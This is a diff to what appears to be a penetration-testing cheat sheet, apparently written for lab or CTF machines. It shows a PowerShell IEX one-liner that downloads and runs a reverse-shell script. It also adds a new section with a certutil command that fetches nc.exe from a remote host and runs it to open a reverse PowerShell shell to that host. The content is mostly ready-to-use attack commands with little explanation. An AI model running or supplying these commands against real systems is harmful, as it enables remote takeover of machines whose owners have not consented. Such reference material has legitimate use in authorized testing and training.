@@ -17,6 +17,12 @@
 
 `IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`
 
+## Download nc and reverse shell
+
+```
+cmd.exe /C net use /D /Y * && cmd.exe /C certutil.exe -urlcache -split -f 'http://10.10.16.65/nc.exe' C:\Users\Public\nc.exe & C:\Users\Public\nc.exe 10.10.16.65 1234 -e powershell.exe
+```
+
 # Linux
 
 ## DNS zone transfer
